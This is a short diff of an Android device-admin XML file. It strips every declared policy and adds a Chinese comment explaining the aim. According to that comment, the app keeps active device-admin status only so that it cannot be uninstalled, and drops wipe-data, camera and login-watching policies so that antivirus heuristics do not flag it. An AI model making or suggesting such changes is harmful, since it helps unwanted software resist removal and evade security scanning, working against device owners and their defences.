@@ -1,11 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
-    <uses-policies>
-        <limit-password />
-        <watch-login />
-        <wipe-data />
-        <expire-password />
-        <disable-camera />
-        <encrypted-storage />
-    </uses-policies>
+    <!-- 不声明任何策略：阻止卸载只需要"设备管理器已激活"这一状态。
+         声明 wipe-data/disable-camera/watch-login 等高危策略会触发杀毒软件启发式报毒。 -->
 </device-admin>
